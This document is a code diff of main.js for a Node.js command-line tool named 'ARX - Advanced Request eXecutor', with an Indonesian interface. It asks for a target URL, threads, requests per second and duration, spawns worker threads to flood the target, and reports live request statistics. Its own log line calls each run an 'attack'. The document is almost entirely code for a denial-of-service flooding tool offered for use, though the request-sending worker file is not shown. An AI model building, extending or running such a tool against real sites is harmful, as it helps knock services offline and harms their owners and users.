@@ -1,140 +1,78 @@
+// main.js
 const readline = require('readline');
 const { Worker } = require('worker_threads');
-const path = require('path');
 
-const rl = readline.createInterface({
-  input: process.stdin,
-  output: process.stdout
-});
+const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
 
-console.log('Selamat datang di ARX - Advanced Request eXecutor\n');
+console.log("\x1b[36mSelamat datang di ARX - Advanced Request eXecutor\x1b[0m");
 
-let targetIdCounter = 0;
-const activeTargets = new Map(); // targetId -> { target, workers, stats }
-const baseStatLine = 2; // mulai dari baris 2 setelah welcome
-
-// Simpan last cursor position agar prompt selalu di bawah statistik
-let promptLine = baseStatLine;
-
-function moveCursor(line) {
-  readline.cursorTo(process.stdout, 0, line);
-  readline.clearLine(process.stdout, 0);
+function ask(query) {
+  return new Promise(resolve => rl.question(query, answer => resolve(answer.trim())));
 }
 
-function printAllStats() {
-  const targetsSorted = Array.from(activeTargets.keys()).sort((a,b) => a - b);
-  targetsSorted.forEach((id, idx) => {
-    const { stats } = activeTargets.get(id);
-    const sent = stats.sent || 0;
-    const success = stats.success || 0;
-    const failed = stats.failed || 0;
+let targetIndex = 0;
+const targets = [];
+const workers = [];
+const statsMap = new Map();
 
-    moveCursor(baseStatLine + idx);
-    process.stdout.write(`[STATS #${id}] Sent: ${sent} | Success: ${success} | Failed: ${failed}     `);
-  });
-}
+async function configureAndStartTarget() {
+  const url = await ask("Target URL: ");
+  const threads = parseInt(await ask("Threads (default 10): ")) || 10;
+  const rps = parseInt(await ask("RPS (default 100): ")) || 100;
+  const duration = parseInt(await ask("Duration in seconds (default 30): ")) || 30;
 
-function updatePromptLine() {
-  const count = activeTargets.size;
-  promptLine = baseStatLine + count + 1;
-}
+  const id = targetIndex++;
+  targets.push({ id, url });
+  statsMap.set(id, { sent: 0, success: 0, failed: 0 });
 
-function showPrompt() {
-  updatePromptLine();
-  moveCursor(promptLine);
-  rl.prompt(true);
-}
+  console.log(`\n[INFO] Starting attack on ${url} for ${duration}s with ${threads} threads at ${rps} RPS.`);
 
-function askTargetInput(callback) {
-  rl.question('Target URL: ', (url) => {
-    if (!url.trim()) return askTargetInput(callback);
-    rl.question('Threads (default 10): ', (threads) => {
-      rl.question('RPS (default 100): ', (rps) => {
-        rl.question('Duration in seconds (default 30): ', (duration) => {
-          callback({
-            url: url.trim(),
-            threads: parseInt(threads) || 10,
-            rps: parseInt(rps) || 100,
-            duration: parseInt(duration) || 30,
-          });
-        });
-      });
+  for (let i = 0; i < threads; i++) {
+    const worker = new Worker('./worker.js', {
+      workerData: { url, rps: rps / threads, duration, index: id, statsInterval: 1 }
     });
-  });
-}
 
-function startTarget(target) {
-  const id = targetIdCounter++;
-  console.log(`\n[INFO] Starting attack on ${target.url} for ${target.duration}s with ${target.threads} threads at ${target.rps} RPS.`);
-
-  const stats = { sent: 0, success: 0, failed: 0 };
-  const workers = [];
-
-  activeTargets.set(id, { target, workers, stats });
-
-  // Buat tiap worker
-  for (let i = 0; i < target.threads; i++) {
-    const worker = new Worker(path.resolve(__dirname, 'worker.js'), {
-      workerData: {
-        id: i,
-        url: target.url,
-        rps: Math.floor(target.rps / target.threads),
-        duration: target.duration
+    worker.on('message', msg => {
+      if (msg.type === 'stats') {
+        const stat = statsMap.get(msg.index);
+        stat.sent += msg.sent;
+        stat.success += msg.success;
+        stat.failed += msg.failed;
+        updateStatsDisplay();
       }
-    });
-
-    worker.on('message', (msg) => {
-      if (msg.stat) {
-        // Update stats agregat
-        stats.sent += msg.sentDelta || 0;
-        stats.success += msg.successDelta || 0;
-        stats.failed += msg.failedDelta || 0;
-
-        printAllStats();
-        showPrompt();
-      }
-    });
-
-    worker.on('error', (err) => {
-      console.error(`[ERROR] Worker #${i} target#${id} error: ${err.message}`);
     });
 
     workers.push(worker);
   }
-
-  // Timer hapus target setelah selesai durasi
-  setTimeout(() => {
-    activeTargets.delete(id);
-    printAllStats();
-    showPrompt();
-    console.log(`\n[INFO] Target #${id} finished: ${target.url}`);
-  }, target.duration * 1000);
 }
 
-console.log('Input target untuk mulai:');
-askTargetInput((target) => {
-  startTarget(target);
-  showPrompt();
-  rl.setPrompt('Command (next/stop): ');
-  rl.prompt();
-});
-
-rl.on('line', (line) => {
-  const input = line.trim().toLowerCase();
-  if (input === 'next') {
-    askTargetInput((target) => {
-      startTarget(target);
-      showPrompt();
-    });
-  } else if (input === 'stop') {
-    console.log('\n[INFO] Stopping input. Existing targets continue running.');
-    rl.close();
-  } else {
-    rl.prompt();
+function updateStatsDisplay() {
+  readline.cursorTo(process.stdout, 0);
+  readline.moveCursor(process.stdout, 0, -targets.length);
+  for (const t of targets) {
+    const s = statsMap.get(t.id);
+    process.stdout.write(`[STATS #${t.id}] Sent: ${s.sent} | Success: ${s.success} | Failed: ${s.failed}            \n`);
   }
-});
+  process.stdout.write("Command (next/stop): ");
+}
 
-rl.on('close', () => {
-  console.log('\n[INFO] Exiting ARX. Bye!');
-  process.exit(0);
-});
+function listenCommands() {
+  rl.on('line', async (line) => {
+    const cmd = line.trim();
+    if (cmd === 'next') {
+      await configureAndStartTarget();
+    } else if (cmd === 'stop') {
+      console.log("[INFO] Stopping all workers...");
+      for (const w of workers) w.terminate();
+      rl.close();
+      process.exit(0);
+    } else {
+      process.stdout.write("Command (next/stop): ");
+    }
+  });
+}
+
+(async () => {
+  await configureAndStartTarget();
+  listenCommands();
+})();
